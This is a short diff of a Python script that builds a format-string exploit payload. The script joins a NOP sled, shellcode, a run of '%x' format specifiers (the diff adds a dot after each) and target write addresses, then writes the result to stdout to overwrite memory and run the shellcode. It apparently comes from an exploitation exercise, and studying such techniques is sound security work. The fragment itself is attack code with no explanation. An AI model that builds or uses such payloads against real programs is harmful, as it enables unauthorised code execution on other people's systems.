@@ -32,4 +32,4 @@ ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(8, 'little'))
 LENTGHOFREQUIRED = 316
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write( NOPSLED + SHELLCODE + b'%x'*270 + b'%016llx.' + ADDRESSTOWRITE1 + ADDRESSTOWRITE2 + b'\n')
+    stdout.write( NOPSLED + SHELLCODE + b'%x.'*270 + b'%016llx.' + ADDRESSTOWRITE1 + ADDRESSTOWRITE2 + b'\n')
